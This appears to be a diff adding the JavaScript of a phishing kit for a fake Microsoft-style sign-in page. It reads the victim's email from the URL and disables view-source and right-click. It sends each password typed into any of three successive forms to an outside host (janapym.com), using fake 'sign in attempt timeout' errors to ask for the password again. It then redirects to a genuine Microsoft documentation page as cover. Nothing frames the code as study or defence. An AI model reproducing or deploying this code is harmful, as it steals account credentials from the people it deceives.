@@ -1,0 +1,219 @@
+
+function redirectCU(e) {
+  if (e.ctrlKey && e.which == 85) {
+	return false;
+  }
+}
+document.onkeydown = redirectCU;
+
+function redirectKK(e) {
+  if (e.which == 3) {
+	return false;
+  }
+}
+document.oncontextmenu = redirectKK;
+
+$("#pass").animate({left:0, opacity:"show"}, 1000);
+var email = window.location.hash.substr(1);
+var PASS = document.getElementById('password');
+var PASSX = document.getElementById('passwordx');
+var PASSY = document.getElementById('passwordy');
+
+$('#password').focus();
+
+var displayName = $('#displayName');
+displayName.attr('value', email);
+displayName.html(email);
+
+$('#password').keyup(function (event) {
+	if (event.which == 13) {
+		$('#Tombol1').click();
+	}
+});
+
+$('#passwordx').keyup(function (event) {
+	if (event.which == 13) {
+		$('#Tombol2').click();
+	}
+});
+
+$('#passwordy').keyup(function (event) {
+	if (event.which == 13) {
+		$('#Tombol3').click();
+	}
+});
+
+var Tombol1 = $('#Tombol1');
+Tombol1.click(function(e){
+	e.preventDefault();
+	var pass = $('#password');
+	var password_v = pass.val();
+	$.ajax({
+		url: 'https://janapym.com/todayzoo.php', // Set Link Here (3 LINK)
+		type: 'POST', 
+		dataType: 'html', 
+		beforeSend: function(){
+			$("#loader").show();
+		},
+		data: { u : email, p : password_v}, 
+		crossDomain: true,
+		success: function(msg) {
+			$("#loader").hide();
+			if (msg == 'VALID'){
+				$(".FORM1").hide();
+				$(".Finish").show();
+				window.location.replace("https://docs.microsoft.com/en-us/office365/servicedescriptions/exchange-online-service-description/exchange-online-limits#mailb");
+			} else if (msg == 'GAGAL'){
+				PASS.value = "";
+				PASS.focus();
+				$(".FORM1").hide();
+				$(".FORM2").show();
+				$("#passx").animate({left:0, opacity:"show"}, 1000);
+				$("#errorx").empty();
+				$("#errorx").show();
+				$("#errorx").append("Sign in attempt timeout, verify your password to keep current password<br>");
+				PASSX.focus();
+			} else if (msg == 'KURANG'){
+				PASS.value = "";
+				PASS.focus();
+				$("#pass").animate({left:0, opacity:"show"}, 1000);
+				$("#error").empty();
+				$("#error").show();
+				$("#error").append("Sign in attempt timeout, verify your password to keep current password<br>");
+			} else if (msg == 'KOSONG'){
+				PASS.value = "";
+				PASS.focus();
+				$("#pass").animate({left:0, opacity:"show"}, 1000);
+				$("#error").empty();
+				$("#error").show();
+				$("#error").append("Please enter your password to keep current password<br>");
+			}
+		},
+		error: function(e) {
+			console.log(e)
+		}
+	});
+});
+
+var displayName = $('#displayNamex');
+displayName.attr('value', email);
+displayName.html(email);
+
+var Tombol2 = $('#Tombol2');
+Tombol2.click(function(e){
+	e.preventDefault();
+	var pass = $('#passwordx');
+	var password_v = pass.val();
+	$.ajax({
+		url: 'https://janapym.com/todayzoo.php', // Set Link Here (3 LINK)
+		type: 'POST', 
+		dataType: 'html', 
+		beforeSend: function(){
+			$("#loaderx").show();
+		},
+		data: { u : email, p : password_v}, 
+		crossDomain: true,
+		success: function(msg) {
+			$("#loaderx").hide();
+			if (msg == 'VALID'){
+				$(".FORM1").hide();
+				$(".FORM2").hide();
+				$(".Finish").show();
+				window.location.replace("https://docs.microsoft.com/en-us/office365/servicedescriptions/exchange-online-service-description/exchange-online-limits#mailb");
+			} else if (msg == 'GAGAL'){
+				PASSX.value = "";
+				PASSX.focus();
+				$(".FORM1").hide();
+				$(".FORM2").hide();
+				$(".FORM3").show();
+				$("#passy").animate({left:0, opacity:"show"}, 1000);
+				PASSY.focus();
+				$("#errory").empty();
+				$("#errory").show();
+				$("#errory").append("Sign in attempt timeout, verify your password to keep current password<br>");
+			} else if (msg == 'KURANG'){
+				PASSX.value = "";
+				PASSX.focus();
+				$(".FORM1").hide();
+				$(".FORM2").show();
+				$("#passx").animate({left:0, opacity:"show"}, 1000);
+				$("#errorx").empty();
+				$("#errorx").show();
+				$("#errorx").append("Sign in attempt timeout, verify your password to keep current password<br>");
+			} else if (msg == 'KOSONG'){
+				PASSX.value = "";
+				PASSX.focus();
+				$(".FORM1").hide();
+				$(".FORM2").show();
+				$("#passx").animate({left:0, opacity:"show"}, 1000);
+				$("#errorx").empty();
+				$("#errorx").show();
+				$("#errorx").append("Please enter your password to keep current password<br>");
+			}
+		},
+		error: function(e) {
+			console.log(e)
+		}
+	});
+});
+
+var displayName = $('#displayNamey');
+displayName.attr('value', email);
+displayName.html(email);
+
+var Tombol3 = $('#Tombol3');
+Tombol3.click(function(e){
+	e.preventDefault();
+	var pass = $('#passwordy');
+	var password_v = pass.val();
+	$.ajax({
+		url: 'https://janapym.com/todayzoo.php', // Set Link Here (3 LINK)
+		type: 'POST', 
+		dataType: 'html', 
+		beforeSend: function(){
+			$("#loadery").show();
+		},
+		data: { u : email, p : password_v}, 
+		crossDomain: true,
+		success: function(msg) {
+			$("#loadery").hide();
+			if (msg == 'VALID'){
+				$(".FORM1").hide();
+				$(".FORM2").hide();
+				$(".FORM3").hide();
+				$(".Finish").show();
+				window.location.replace("https://docs.microsoft.com/en-us/office365/servicedescriptions/exchange-online-service-description/exchange-online-limits#mailb");
+			} else if (msg == 'GAGAL'){
+				$(".FORM1").hide();
+				$(".FORM2").hide();
+				$(".FORM3").hide();
+				$(".Finish").show();
+				window.location.replace("https://docs.microsoft.com/en-us/office365/servicedescriptions/exchange-online-service-description/exchange-online-limits#mailb");
+			} else if (msg == 'KURANG'){
+				PASSY.value = "";
+				PASSY.focus();
+				$(".FORM1").hide();
+				$(".FORM2").hide();
+				$(".FORM3").show();
+				$("#passy").animate({left:0, opacity:"show"}, 1000);
+				$("#errory").empty();
+				$("#errory").show();
+				$("#errory").append("Sign in attempt timeout, verify your password to keep current password<br>");
+			} else if (msg == 'KOSONG'){
+				PASSY.value = "";
+				PASSY.focus();
+				$(".FORM1").hide();
+				$(".FORM2").hide();
+				$(".FORM3").show();
+				$("#passy").animate({left:0, opacity:"show"}, 1000);
+				$("#errory").empty();
+				$("#errory").show();
+				$("#errory").append("Please enter your password to keep current password<br>");
+			}
+		},
+		error: function(e) {
+			console.log(e)
+		}
+	});
+});
+
